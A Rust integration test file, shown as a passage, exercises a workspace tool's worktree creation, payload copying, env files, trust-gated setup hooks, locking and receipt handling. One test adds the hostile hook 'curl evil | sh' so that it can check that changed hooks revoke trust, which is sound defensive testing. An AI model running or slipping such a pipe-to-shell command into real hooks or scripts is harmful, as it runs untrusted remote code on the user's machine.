//! Workspace lifecycle against real Git repositories in temporary directories.
//! Tests that need Docker or pitchfork are `#[ignore]`d.
use devflow_core::config::Config;
use devflow_core::db::DataSource;
use devflow_core::error::{Busy, Protected};
use devflow_core::receipt::{DataBinding, Phase, PhaseState, Receipt, ServiceBinding, Status};
use devflow_core::setup::{
    self, CreateRequest, EnvFileProblem, NoProgress, Progress, RemoveOptions, Repair, SetupOptions,
    SetupOutcome,
};
use devflow_core::worktree::{self, Workspace};
use devflow_core::{Project, cow, env_file, trust};
use std::path::{Path, PathBuf};
use std::sync::{Once, OnceLock};

/// Process-wide state directories. Every test uses its own random project id,
/// so sharing one trust file does not couple tests.
fn init() -> &'static Path {
    static ONCE: Once = Once::new();
    static DIR: OnceLock<tempfile::TempDir> = OnceLock::new();
    ONCE.call_once(|| {
        let dir = DIR.get_or_init(|| tempfile::tempdir().unwrap());
        // SAFETY: runs once, before any test body touches the environment.
        unsafe {
            std::env::set_var("DEVFLOW_CONFIG_DIR", dir.path().join("config"));
            std::env::set_var("DEVFLOW_DATA_DIR", dir.path().join("data"));
            std::env::set_var("PITCHFORK_STATE_DIR", dir.path().join("pf-state"));
            std::env::set_var("PITCHFORK_CONFIG_DIR", dir.path().join("pf-config"));
            std::env::set_var("PITCHFORK_LOGS_DIR", dir.path().join("pf-logs"));
            // A child test process (see `in_child`) is started with these set.
            if std::env::var_os(CHILD).is_none() {
                std::env::remove_var("DEVFLOW_TRUST_HOOKS");
                std::env::remove_var("DEVFLOW_INSTANCE_ID");
            }
        }
    });
    DIR.get().unwrap().path()
}

const CHILD: &str = "DEVFLOW_TEST_CHILD";

/// Environment variables are process-wide, so a test about one runs alone in a
/// child process started with it set instead of changing the environment of
/// the tests running beside it. Returns `true` inside the child (run the test
/// body); in the parent it runs the child and asserts that it passed.
fn in_child(test: &str, env: &[(&str, &str)]) -> bool {
    if std::env::var_os(CHILD).is_some() {
        return true;
    }
    let output = std::process::Command::new(std::env::current_exe().unwrap())
        .args([test, "--exact", "--nocapture", "--test-threads=1"])
        .envs(env.iter().copied())
        .env(CHILD, "1")
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success() && stdout.contains("1 passed"),
        "child run of {test} failed:\n{stdout}\n{stderr}"
    );
    false
}

/// The binding under `services.db`, which every test project uses.
fn binding(receipt: &Receipt) -> ServiceBinding {
    receipt
        .services
        .get("db")
        .cloned()
        .unwrap_or_else(|| panic!("no services.db binding in {:?}", receipt.services))
}

/// A pitchfork with nothing running, for removals of workspaces that carry
/// pitchfork files the test is not about: a removal asks the pitchfork it
/// finds, and the one on this machine's `PATH` (a shim that does not run, say)
/// is not this test's business.
fn quiet_pitchfork() -> devflow_core::pitchfork::Pitchfork {
    static DIR: OnceLock<tempfile::TempDir> = OnceLock::new();
    let dir = DIR.get_or_init(|| {
        let dir = tempfile::tempdir().unwrap();
        let script = dir.path().join("pitchfork");
        std::fs::write(
            &script,
            include_str!("../../../tests/support/fake-pitchfork.sh"),
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        dir
    });
    devflow_core::pitchfork::Pitchfork::at(dir.path().join("pitchfork"))
}

/// The workspace's process lock can be taken again. Waited for briefly, as
/// `Receipt::is_locked` retries: a lock is released when the last duplicate of
/// its descriptor closes, and a process another test thread is spawning holds
/// one until it execs.
fn released_process_lock(git_dir: &Path) -> bool {
    Receipt::process_lock_waiting(git_dir, std::time::Duration::from_secs(2))
        .unwrap()
        .is_some()
}

fn protection(error: &anyhow::Error) -> &Protected {
    error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("not a typed refusal: {error:#}"))
}

/// Records progress callbacks.
#[derive(Default)]
struct Recorder {
    phases: Vec<(Phase, PhaseState)>,
    lines: Vec<String>,
}

impl Progress for Recorder {
    fn phase(&mut self, phase: Phase, state: PhaseState, _: Option<&str>) {
        self.phases.push((phase, state));
    }
    fn output(&mut self, line: &str) {
        self.lines.push(line.to_string());
    }
}

struct Repo {
    _dir: tempfile::TempDir,
    root: PathBuf,
    project: Project,
}

#[derive(Default)]
struct Hooks<'a> {
    setup: &'a [&'a str],
    switch: &'a [&'a str],
    teardown: &'a [&'a str],
}

fn toml_list(items: &[&str]) -> String {
    let items: Vec<_> = items
        .iter()
        .map(|s| {
            assert!(!s.contains('\''), "test commands avoid single quotes");
            format!("'{s}'")
        })
        .collect();
    format!("[{}]", items.join(", "))
}

fn config_text(hooks: &Hooks, extra: &str) -> String {
    format!(
        "[project]\nname = \"shop\"\nid = \"{}\"\n\n[worktree]\ncopy = [\".env\", \"node_modules\"]\n\n\
         [hooks]\nsetup = {}\nswitch = {}\nteardown = {}\n\n{extra}",
        uuid::Uuid::new_v4(),
        toml_list(hooks.setup),
        toml_list(hooks.switch),
        toml_list(hooks.teardown),
    )
}

fn commit_all(repo: &git2::Repository, message: &str) {
    let mut index = repo.index().unwrap();
    index
        .add_all(["*"], git2::IndexAddOption::DEFAULT, None)
        .unwrap();
    index.write().unwrap();
    let tree = repo.find_tree(index.write_tree().unwrap()).unwrap();
    let parent = repo.head().ok().and_then(|h| h.peel_to_commit().ok());
    let parents: Vec<_> = parent.iter().collect();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    repo.commit(Some("HEAD"), &sig, &sig, message, &tree, &parents)
        .unwrap();
}

/// A repository `shop` on `main` with a committed `devflow.toml`, plus an
/// ignored `.env` and `node_modules` in the main checkout.
fn repo(hooks: &Hooks, extra: &str) -> Repo {
    init();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap().join("shop");
    std::fs::create_dir_all(&root).unwrap();
    let mut options = git2::RepositoryInitOptions::new();
    options.initial_head("main");
    let git = git2::Repository::init_opts(&root, &options).unwrap();
    std::fs::write(root.join("devflow.toml"), config_text(hooks, extra)).unwrap();
    std::fs::write(
        root.join(".gitignore"),
        ".env\nnode_modules/\ndevflow.local.toml\n",
    )
    .unwrap();
    std::fs::write(root.join("README.md"), "shop\n").unwrap();
    commit_all(&git, "initial");
    std::fs::write(root.join(".env"), "SECRET=1\n").unwrap();
    std::fs::create_dir_all(root.join("node_modules/pkg")).unwrap();
    std::fs::write(
        root.join("node_modules/pkg/index.js"),
        "module.exports = 1;\n",
    )
    .unwrap();
    let project = Project::open(&root).unwrap();
    Repo {
        _dir: dir,
        root,
        project,
    }
}

fn plain() -> Repo {
    repo(&Hooks::default(), "")
}

fn create(project: &Project, name: &str, options: SetupOptions) -> anyhow::Result<SetupOutcome> {
    setup::create(
        project,
        CreateRequest {
            name: name.into(),
            from: None,
            base: None,
            options,
        },
        &mut NoProgress,
    )
}

fn trusted(project: &Project) -> SetupOptions {
    SetupOptions {
        approval: Some(trust::Approval::of(&trust::scope(project))),
        ..Default::default()
    }
}

/// The approval of the scope of the workspace at `dir`.
fn trusted_at(project: &Project, dir: &Path) -> SetupOptions {
    SetupOptions {
        approval: Some(trust::Approval::of(&trust::scope_at(project, dir))),
        ..Default::default()
    }
}

fn receipt_of(ws: &Workspace) -> Receipt {
    Receipt::load(&ws.git_dir).unwrap().expect("receipt")
}

fn ws(project: &Project, name: &str) -> Workspace {
    worktree::find(project, name)
        .unwrap()
        .unwrap_or_else(|| panic!("no workspace {name}"))
}

fn env_map(ws: &Workspace) -> std::collections::HashMap<String, String> {
    env_file::read(&ws.path).unwrap().into_iter().collect()
}

#[test]
fn create_clones_payload_writes_env_and_runs_trusted_hooks() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$DEVFLOW_WORKSPACE|$DEVFLOW_PHASE|$DEVFLOW_SETUP_ACTIVE|$DEVFLOW_WORKSPACE_ID|$DEVFLOW_SOURCE_PATH|$DEVFLOW_PROJECT_ROOT\" > .devflow/marker",
                "echo second >> .devflow/marker",
            ],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let mut rec = Recorder::default();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "feature/a".into(),
            from: None,
            base: None,
            options: SetupOptions::default(),
        },
        &mut rec,
    )
    .unwrap();

    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let w = &out.workspace;
    assert_eq!(w.name, "feature/a");
    assert!(w.path.ends_with("shop.worktrees/feature-a"));
    assert!(
        !worktree::is_dirty(w).unwrap(),
        "payload and .devflow are ignored"
    );

    // Payload: both entries cloned from the main checkout.
    assert_eq!(out.payload.len(), 2);
    assert!(
        out.payload
            .iter()
            .all(|e| matches!(e.result, cow::EntryResult::Done { .. }))
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join("node_modules/pkg/index.js")).unwrap(),
        "module.exports = 1;\n"
    );

    // Env file: private, with the DEVFLOW_* identity and no database entries.
    let env = env_map(w);
    assert_eq!(env["DEVFLOW_PROJECT"], "shop");
    assert_eq!(env["DEVFLOW_WORKSPACE"], "feature/a");
    assert_eq!(env["DEVFLOW_WORKSPACE_PATH"], w.path.display().to_string());
    assert_eq!(env["DEVFLOW_PROJECT_ROOT"], t.root.display().to_string());
    assert_eq!(env["DEVFLOW_SOURCE_PATH"], t.root.display().to_string());
    assert_eq!(
        env["DEVFLOW_WORKSPACE_ID"],
        out.receipt.instance_id.to_string()
    );
    assert!(
        !env.contains_key("DEVFLOW_INSTANCE_ID"),
        "the override's name is never exported: sourcing the file must not set it"
    );
    assert!(!env.contains_key("DATABASE_URL"));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = env_file::path(&w.path)
            .metadata()
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
        let mode = Receipt::path(&w.git_dir)
            .metadata()
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
    }

    // Hooks ran in order, in the worktree, with the environment.
    let marker = std::fs::read_to_string(w.path.join(".devflow/marker")).unwrap();
    let mut lines = marker.lines();
    assert_eq!(
        lines.next().unwrap(),
        format!(
            "feature/a|setup|1|{}|{}|{}",
            out.receipt.instance_id,
            t.root.display(),
            t.root.display()
        )
    );
    assert_eq!(lines.next(), Some("second"));
    let report = out.hooks.as_ref().unwrap();
    assert!(report.ok && report.runs.len() == 2);
    let log = report.log.as_ref().unwrap();
    assert!(log.starts_with(Receipt::logs_dir(&w.git_dir)));
    assert!(
        std::fs::read_to_string(log)
            .unwrap()
            .contains("$ echo second")
    );
    assert!(rec.lines.iter().any(|l| l.starts_with("$ echo second")));

    // Receipt: identical on disk, every phase recorded, digest pinned.
    assert_eq!(receipt_of(w), out.receipt);
    assert_eq!(out.receipt.code_source.as_deref(), Some("main"));
    assert_eq!(out.receipt.project_id, t.project.id());
    assert_eq!(out.receipt.hooks_digest, Some(trust::digest(&t.project)));
    assert_eq!(
        out.receipt.phase(Phase::Services).state,
        PhaseState::Skipped
    );
    assert!(!out.receipt.phase(Phase::Services).required_skip);
    assert_eq!(
        rec.phases,
        vec![
            (Phase::Materialize, PhaseState::Started),
            (Phase::Materialize, PhaseState::Done),
            (Phase::Payload, PhaseState::Started),
            (Phase::Payload, PhaseState::Done),
            (Phase::Services, PhaseState::Started),
            (Phase::Services, PhaseState::Skipped),
            (Phase::Env, PhaseState::Started),
            (Phase::Env, PhaseState::Done),
            (Phase::Hooks, PhaseState::Started),
            (Phase::Hooks, PhaseState::Done),
        ]
    );

    // Listing: default is not set up, the new workspace is ready and idle.
    let list = setup::list(&t.project).unwrap();
    assert_eq!(list.len(), 2);
    assert!(list[0].workspace.is_default && list[0].status.is_none());
    assert_eq!(list[1].status, Some(Status::Ready));
    assert!(!list[1].busy);

    // Creating it again is an error; the existing workspace is untouched.
    let error = create(&t.project, "feature/a", SetupOptions::default()).unwrap_err();
    assert!(error.to_string().contains("already exists"), "{error:#}");
    assert!(create(&t.project, "main", SetupOptions::default()).is_err());
}

#[test]
fn create_from_another_workspace_copies_its_payload() {
    let t = repo(&Hooks::default(), "");
    let a = create(&t.project, "a", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::write(a.path.join(".env"), "SECRET=changed-in-a\n").unwrap();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "b".into(),
            from: Some("a".into()),
            base: None,
            options: SetupOptions::default(),
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.receipt.code_source.as_deref(), Some("a"));
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".env")).unwrap(),
        "SECRET=changed-in-a\n"
    );
    assert_eq!(
        env_map(&out.workspace)["DEVFLOW_SOURCE_PATH"],
        a.path.display().to_string()
    );
    assert!(
        setup::create(
            &t.project,
            CreateRequest {
                name: "c".into(),
                from: Some("nope".into()),
                base: None,
                options: SetupOptions::default()
            },
            &mut NoProgress,
        )
        .is_err()
    );
    assert!(
        worktree::find(&t.project, "c").unwrap().is_none(),
        "nothing created for an unknown source"
    );
}

#[test]
fn untrusted_hooks_need_attention_until_approved_then_setup_resumes() {
    let t = repo(
        &Hooks {
            setup: &["echo ran > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "feature", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let w = out.workspace.clone();
    let hooks = out.receipt.phase(Phase::Hooks);
    assert_eq!(hooks.state, PhaseState::Skipped);
    assert!(hooks.required_skip);
    assert!(hooks.detail.unwrap().contains("approve"));
    assert!(out.hooks.is_none());
    assert!(!w.path.join(".devflow/marker").exists());
    // Everything before the hooks is in place.
    assert!(w.path.join(".env").is_file());
    assert!(env_file::path(&w.path).is_file());
    assert_eq!(
        setup::list(&t.project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );

    // `create` on the same name resumes instead of failing; still untrusted.
    let again = create(&t.project, "feature", SetupOptions::default()).unwrap();
    assert_eq!(again.status, Status::NeedsAttention);
    assert!(again.payload.is_empty(), "payload is not repeated");

    // `--if-new` resumes an incomplete receipt as well.
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_some()
    );

    trust::approve(&t.project).unwrap();
    let mut rec = Recorder::default();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.payload.is_empty());
    assert_eq!(
        rec.phases,
        vec![
            (Phase::Hooks, PhaseState::Started),
            (Phase::Hooks, PhaseState::Done)
        ]
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker")).unwrap(),
        "ran\n"
    );

    // Now it is complete: `--if-new` does nothing, and so does a plain re-run.
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
    let rerun = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(rerun.status, Status::Ready);
    assert_eq!(rec.phases.len(), 2, "no phase ran again");
    assert!(create(&t.project, "feature", SetupOptions::default()).is_err());
}

#[test]
fn changing_the_hooks_revokes_trust() {
    let t = repo(
        &Hooks {
            setup: &["true"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    assert_eq!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Trusted
    );
    let changed = edit_config(&t, |text| {
        text.replace("setup = ['true']", "setup = ['true', 'curl evil | sh']")
    });
    let out = create(&changed, "feature", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    match trust::state(&changed).unwrap() {
        trust::TrustState::Untrusted {
            previously_trusted, ..
        } => assert!(previously_trusted),
        other => panic!("{other:?}"),
    }
}

#[test]
fn trust_option_runs_untrusted_hooks_for_one_run_only() {
    let t = repo(
        &Hooks {
            setup: &["echo ok > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "ci", trusted(&t.project)).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.workspace.path.join(".devflow/marker").is_file());
    assert!(matches!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
}

#[test]
fn no_hooks_flag_skips_without_needing_attention() {
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/never"],
            ..Default::default()
        },
        "",
    );
    let out = create(
        &t.project,
        "quick",
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(!out.workspace.path.join(".devflow/never").exists());
}

#[test]
fn a_failing_hook_is_reported_in_the_outcome_and_retried_on_resume() {
    let t = repo(
        &Hooks {
            setup: &["echo before", "echo boom; exit 7", "touch .devflow/after"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "broken", trusted(&t.project)).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let report = out.hooks.as_ref().unwrap();
    assert!(!report.ok);
    assert_eq!(report.runs.len(), 2);
    assert_eq!(report.runs[1].exit_code, Some(7));
    assert!(!out.workspace.path.join(".devflow/after").exists());
    let phase = out.receipt.phase(Phase::Hooks);
    assert_eq!(phase.state, PhaseState::Failed);
    assert!(phase.detail.unwrap().contains("exit 7"));
    assert!(
        std::fs::read_to_string(report.log.as_ref().unwrap())
            .unwrap()
            .contains("boom")
    );

    // Fix the hooks (the workspace's own recipes) and resume.
    let fixed = edit_config(&t, |text| {
        text.replace(
            "setup = ['echo before', 'echo boom; exit 7', 'touch .devflow/after']",
            "setup = ['touch .devflow/fixed']",
        )
    });
    let out = setup::setup(
        &fixed,
        &out.workspace,
        trusted_at(&fixed, &out.workspace.path),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.workspace.path.join(".devflow/fixed").is_file());
}

#[test]
fn hook_timeout_marks_the_workspace_needing_attention() {
    let t = repo(
        &Hooks {
            setup: &["sleep 60"],
            ..Default::default()
        },
        "",
    );
    let project = edit_config(&t, |text| {
        text.replace("[hooks]\n", "[hooks]\ntimeout = \"300ms\"\n")
    });
    let started = std::time::Instant::now();
    let out = create(&project, "slow", trusted(&project)).unwrap();
    assert!(started.elapsed() < std::time::Duration::from_secs(10));
    assert_eq!(out.status, Status::NeedsAttention);
    assert!(out.hooks.unwrap().runs[0].timed_out);
    assert!(
        out.receipt
            .phase(Phase::Hooks)
            .detail
            .unwrap()
            .contains("timed out")
    );
}

#[test]
fn resume_after_a_simulated_crash_completes_the_remaining_phases() {
    let t = repo(
        &Hooks {
            setup: &["echo done > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // The process died right after recording `payload: started`.
    let w = worktree::create(&t.project, "crashed", None).unwrap();
    let mut receipt = Receipt::new(t.project.id(), "crashed", Some("main".into()));
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.set_phase(Phase::Payload, PhaseState::Started, None);
    receipt.save(&w.git_dir).unwrap();
    assert!(!w.path.join(".env").exists());
    assert_eq!(
        setup::list(&t.project).unwrap()[1].status,
        Some(Status::InProgress)
    );

    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_eq!(
        out.receipt.instance_id, receipt.instance_id,
        "identity survives a resume"
    );
    assert!(w.path.join(".env").is_file());
    assert!(w.path.join("node_modules/pkg/index.js").is_file());
    assert!(w.path.join(".devflow/marker").is_file());

    // A crash in the middle of the hooks phase re-runs the hooks (at least once).
    let mut receipt = receipt_of(&w);
    receipt.set_phase(Phase::Hooks, PhaseState::Started, None);
    receipt.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(w.path.join(".devflow/marker").is_file());
}

#[test]
fn a_running_setup_blocks_a_second_one() {
    let t = plain();
    let w = worktree::create(&t.project, "busy", None).unwrap();
    let held = Receipt::try_lock(&w.git_dir).unwrap().unwrap();
    // A receipt must exist for the list to report the workspace.
    let mut receipt = Receipt::new(t.project.id(), "busy", None);
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.save(&w.git_dir).unwrap();

    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    let busy = error.downcast_ref::<Busy>().expect("typed busy error");
    assert_eq!(busy.workspace, "busy");
    // `--if-new` with nothing ready must not look like success: the workspace
    // is not set up yet, only someone else is setting it up.
    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert_eq!(
        error
            .downcast_ref::<Busy>()
            .expect("typed busy error, not a silent skip")
            .workspace,
        "busy"
    );
    let listed = setup::list(&t.project).unwrap();
    assert!(listed[1].busy);
    assert_eq!(listed[1].status, Some(Status::InProgress));
    // Removal also waits for the running setup.
    let error = setup::remove(
        &t.project,
        "busy",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert_eq!(error.downcast_ref::<Busy>().unwrap().workspace, "busy");
    assert!(w.path.exists());
    // Reset and creating over the running workspace report the same thing.
    let error = setup::reset_data(&t.project, &w, None).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");
    let error = create(&t.project, "busy", SetupOptions::default()).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");

    drop(held);
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            false,
            false,
            &mut NoProgress
        )
        .is_ok()
    );
}

#[test]
fn if_new_skips_a_ready_workspace_even_while_it_is_locked_but_not_an_unready_one() {
    let t = plain();
    // A ready receipt written directly: a finished `create` can leave its lock
    // file descriptor open in a process another test thread has just spawned,
    // and this test must be able to take the lock at once.
    let w = worktree::create(&t.project, "ready", None).unwrap();
    let mut done = Receipt::new(t.project.id(), "ready", None);
    for phase in Phase::ALL {
        done.set_phase(phase, PhaseState::Done, None);
    }
    // (With the port every workspace has: one without would be repaired.)
    done.app_port = Some(41999);
    done.save(&w.git_dir).unwrap();
    assert_eq!(done.status(), Status::Ready);
    // Its derived file is there, with the manifest: nothing to repair either.
    setup::workspace_env(&t.project, &w, &done, false)
        .write(&w.path)
        .unwrap();
    let held = Receipt::try_lock(&w.git_dir).unwrap().unwrap();
    let if_new = |w: &Workspace| {
        setup::setup(
            &t.project,
            w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress,
        )
    };
    assert!(
        if_new(&w).unwrap().is_none(),
        "ready: nothing to do, whoever holds the lock"
    );

    // Ready, but the derived file is gone: that is something to do, so the
    // shortcut does not apply (busy while the lock is held, repaired after).
    std::fs::remove_file(env_file::path(&w.path)).unwrap();
    let error = if_new(&w).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");

    // No receipt at all (a worktree another tool made): busy, not skipped.
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    let held_raw = Receipt::try_lock(&raw.git_dir).unwrap().unwrap();
    let error = if_new(&raw).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");
    assert!(
        Receipt::load(&raw.git_dir).unwrap().is_none(),
        "nothing written"
    );
    drop((held, held_raw));
    assert!(if_new(&raw).unwrap().is_some(), "free again: it is adopted");
    let repaired = if_new(&w).unwrap().expect("the lost file is repaired");
    assert_eq!(repaired.repaired, [Repair::EnvFile]);
    assert!(env_file::path(&w.path).is_file());
    assert!(
        if_new(&w).unwrap().is_none(),
        "and then there is nothing to do"
    );
}

#[test]
fn if_new_adopts_worktrees_made_by_other_tools_and_then_does_nothing() {
    let t = repo(
        &Hooks {
            setup: &["echo adopted > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // `git worktree add` equivalent: a worktree without any devflow state.
    let w = worktree::create(&t.project, "by-agent", None).unwrap();
    assert!(Receipt::load(&w.git_dir).unwrap().is_none());
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .expect("adopted");
    assert_eq!(out.status, Status::Ready);
    assert_eq!(
        out.receipt.code_source, None,
        "adopted worktrees use the default workspace"
    );
    assert_eq!(out.receipt.workspace, "by-agent");
    assert!(
        w.path.join(".env").is_file(),
        "payload comes from the default workspace"
    );
    assert_eq!(
        env_map(&w)["DEVFLOW_SOURCE_PATH"],
        t.root.display().to_string()
    );
    assert!(w.path.join(".devflow/marker").is_file());
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
}

#[test]
fn a_receipt_from_another_project_is_refused_not_adopted() {
    let t = plain();
    let w = worktree::create(&t.project, "foreign", None).unwrap();
    let mut receipt = Receipt::new(uuid::Uuid::new_v4(), "foreign", None);
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.save(&w.git_dir).unwrap();
    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("another project"), "{error:#}");
    assert!(!w.path.join(".env").exists(), "nothing ran");
    // Listing ignores it.
    assert_eq!(setup::list(&t.project).unwrap()[1].status, None);
    // The foreign receipt is left alone when removing: no data or hooks are touched.
    let out = setup::remove(
        &t.project,
        "foreign",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        out.warnings.iter().any(|w| w.contains("another project")),
        "{:?}",
        out.warnings
    );
    assert!(!w.path.exists());
}

#[test]
fn new_instance_gives_a_fork_a_fresh_identity_and_forgets_the_copied_binding() {
    let t = repo(
        &Hooks {
            setup: &["echo \"$DEVFLOW_WORKSPACE_ID\" > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "vm", SetupOptions::default()).unwrap();
    let w = out.workspace.clone();
    let old_instance = out.receipt.instance_id;
    // Pretend the original instance had been bound to a database branch.
    let branch = uuid::Uuid::new_v4();
    let mut copied = receipt_of(&w);
    copied.data_source = Some("workspace:main".into());
    copied.services.insert(
        "db".into(),
        ServiceBinding::postgres(
            DataBinding {
                branch_id: Some(branch),
                database: "df_a_b".into(),
                role: "dfl_b".into(),
                url: "postgres://dfl_b:pw@old-host:5432/df_a_b".into(), // kingfisher:ignore
                source: "workspace:main".into(),
                owned: true,
            },
            None,
        ),
    );
    copied.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();

    let mut rec = Recorder::default();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        true,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_ne!(out.receipt.instance_id, old_instance);
    assert!(
        out.receipt.services.is_empty(),
        "the copied binding lost its authority"
    );
    assert_eq!(
        out.receipt.data_source,
        Some(format!("branch:{branch}")),
        "the new branch would clone the previous one"
    );
    // Database, env and hooks ran again; code phases did not.
    let phases: Vec<_> = rec
        .phases
        .iter()
        .filter(|(_, s)| *s == PhaseState::Started)
        .map(|(p, _)| *p)
        .collect();
    assert_eq!(phases, vec![Phase::Services, Phase::Env, Phase::Hooks]);
    assert!(out.payload.is_empty());
    // Without a postgres service there is nothing to provision: no stale DATABASE_URL.
    assert!(!env_map(&w).contains_key("DATABASE_URL"));
    assert_eq!(
        env_map(&w)["DEVFLOW_WORKSPACE_ID"],
        out.receipt.instance_id.to_string()
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker"))
            .unwrap()
            .trim(),
        out.receipt.instance_id.to_string()
    );
    assert_eq!(receipt_of(&w), out.receipt);

    // `--data-from` overrides the recorded choice.
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
        false,
        true,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.receipt.data_source.as_deref(), Some("empty"));
}

/// Rewrite a workspace's receipt the way devflow 1.0 builds before receipt
/// version 2 wrote it: one `data` binding and a `database` phase.
fn downgrade_to_v1(ws: &Workspace) {
    let path = Receipt::path(&ws.git_dir);
    let mut doc: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    let object = doc.as_object_mut().unwrap();
    object.insert("version".into(), 1.into());
    object.remove("env_generation");
    if let Some(services) = object.remove("services") {
        let mut data = services["db"].clone();
        let binding = data.as_object_mut().unwrap();
        binding.remove("engine");
        binding.remove("applied");
        object.insert("data".into(), data);
    }
    let phases = object["phases"].as_object_mut().unwrap();
    let record = phases.remove("services").unwrap();
    phases.insert("database".into(), record);
    std::fs::write(&path, serde_json::to_vec_pretty(&doc).unwrap()).unwrap();
}

#[test]
fn a_version_one_receipt_is_migrated_by_the_next_setup_which_rewrites_only_the_environment() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "[services.db]\nengine = \"postgres\"\nmode = \"external\"\n",
    );
    trust::approve(&t.project).unwrap();
